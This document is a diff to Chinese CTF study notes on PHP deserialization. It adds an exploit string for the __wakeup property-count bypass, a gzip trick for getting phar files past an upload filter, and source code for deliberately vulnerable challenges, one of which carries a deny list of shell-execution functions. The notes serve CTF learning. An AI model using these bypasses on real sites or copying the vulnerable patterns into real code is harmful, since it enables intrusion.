@@ -234,8 +234,42 @@ PHP before 5.6.25 and 7.x before 7.0.10
 
 当序列化字符串中表示对象属性个数的值**大于**真实属性个数时会跳过`__wakeup()`的执行
 
+例题分析：
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class User {
+    public $name;
+
+    function __construct($name) {
+        $this->name = $name;
+    }
+
+    function __wakeup() {
+        $this->name = "Guest";
+    }
+
+    function __destruct() {
+        if ($this->name === "Admin") {
+            echo "Greetings, Admin! Your flag is: FLAG{example_flag}";
+        }
+        echo "Goodbye, " . $this->name . "!";
+    }
+}
+
+unserialize($_GET['u']);
+```
+
+EXP：
+
+```
+O:4:"User":2:{s:4:"name";s:5:"Admin";}
+```
+
 - `PHP > 7.1` 反序列化时对类属性的**访问控制**不敏感，只要属性名相同，就可以正常反序列化
-- 表示字符类型的标识`S`为**大写**时，其内容会被当成十六进制解析，如`s:3:"\61\62\63"`
+- 表示字符类型的标识`S`为**大写**时，其内容会被当成十六进制解析，如`S:3:"\61\62\63"`
 - 使用`+`绕过`preg_match('/^O:\d+/')`正则检查，如`O:+4:"test"`
 
 练习题
@@ -250,7 +284,9 @@ PHP before 5.6.25 and 7.x before 7.0.10
 
 题目中有多个类，且每个类存在魔术方法
 
-题目？？
+## 练习题
+
+- BUUCTF - [NewStarCTF 公开赛赛道]UnserializeOne
 
 ## Phar 反序列化
 
@@ -372,6 +408,17 @@ $phar->addFromString("test.txt", "test"); //添加要压缩的文件
 //签名自动计算
 $phar->stopBuffering();
 
+```
+
+- 文件后缀名检测，白名单文件上传，仅支持图片后缀上传。
+- 上传正常 phar 文件时，提示`!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)` ，使用 gzip 压缩绕过
+
+```bash
+gzip test.phar
+```
+
+```
+file=pupload/fa75c83c80cab8c9dc30d3f1c1b6f610.gif
 ```
 
 #### [SWPUCTF 2018]SimplePHP
@@ -531,6 +578,7 @@ class Test
 ### 练习题
 
 - [D3CTF 2019]EzUpload
+- [NewStarCTF 2023 公开赛道]Unserialize Again
 - [CISCN2019 华北赛区 Day1 Web1]Dropbox
 
 ```php
@@ -956,4 +1004,135 @@ O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin
 
 ### buuctf - 2020-网鼎杯朱雀组-phpweb
 
+```php
+<?php
+$disable_fun = array(
+    "exec",
+    "shell_exec",
+    "system",
+    "passthru",
+    "proc_open",
+    "show_source",
+    "phpinfo",
+    "popen",
+    "dl",
+    "eval",
+    "proc_terminate",
+    "touch",
+    "escapeshellcmd",
+    "escapeshellarg",
+    "assert",
+    "substr_replace",
+    "call_user_func_array",
+    "call_user_func",
+    "array_filter",
+    "array_walk",
+    "array_map",
+    "registregister_shutdown_function",
+    "register_tick_function",
+    "filter_var",
+    "filter_var_array",
+    "uasort",
+    "uksort",
+    "array_reduce",
+    "array_walk",
+    "array_walk_recursive",
+    "pcntl_exec",
+    "fopen",
+    "fwrite",
+    "file_put_contents"
+);
+function gettime($func, $p)
+{
+    $result = call_user_func($func, $p);
+    $a = gettype($result);
+    if ($a == "string") {
+        return $result;
+    } else {
+        return "";
+    }
+}
+class Test
+{
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+    function __destruct()
+    {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+$func = $_REQUEST["func"];
+$p = $_REQUEST["p"];
+if ($func != null) {
+    $func = strtolower($func);
+    if (!in_array($func, $disable_fun)) {
+        echo gettime($func, $p);
+    } else {
+        die("Hacker...");
+    }
+}
+
+```
+
 ### ISCC_2022_POP2022
+
+```php
+<?php
+echo 'Happy New Year~ MAKE A WISH<br>';
+if (isset($_GET['wish'])) {
+    @unserialize($_GET['wish']);
+} else {
+    $a = new Road_is_Long;
+    highlight_file(__FILE__);
+}
+/***************************pop your 2022*****************************/
+class Road_is_Long
+{
+    public $page;
+    public $string;
+    public function __construct($file = 'index.php')
+    {
+        $this->page = $file;
+    }
+    public function __toString()
+    {
+        return $this->string->page;
+    }
+    public function __wakeup()
+    {
+        if (preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {
+            echo "You can Not Enter 2022";
+            $this->page = "index.php";
+        }
+    }
+}
+class Try_Work_Hard
+{
+    protected  $var;
+    public function append($value)
+    {
+        include($value);
+    }
+    public function __invoke()
+    {
+        $this->append($this->var);
+    }
+}
+class Make_a_Change
+{
+    public $effort;
+    public function __construct()
+    {
+        $this->effort = array();
+    }
+    public function __get($key)
+    {
+        $function = $this->effort;
+        return $function();
+    }
+}
+/**********************Try to See flag.php*****************************/
+
+```
